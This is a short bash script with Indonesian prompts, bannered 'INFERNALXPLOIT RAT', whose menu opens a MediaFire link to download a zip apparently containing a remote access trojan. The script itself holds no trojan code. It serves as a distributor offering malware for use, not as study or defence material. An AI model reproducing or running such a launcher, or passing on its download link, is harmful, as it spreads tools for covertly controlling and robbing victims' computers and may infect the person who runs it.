#!/bin/bash

# Membersihkan layar
clear

# Menampilkan banner
echo "=============================="
echo "     INFERNALXPLOIT RAT       "
echo "=============================="

# Menampilkan menu
echo "1. Download RAT"
echo "2. Exit"
echo -n "Pilih opsi: "
read pilihan

if [ "$pilihan" == "1" ]; then
    # Buka link MediaFire
    xdg-open "https://www.mediafire.com/file/xpjn8y3g51ekmnn/Khusus+rat.zip/file"
elif [ "$pilihan" == "2" ]; then
    echo "Keluar..."
    exit
else
    echo "Pilihan tidak valid!"
fi
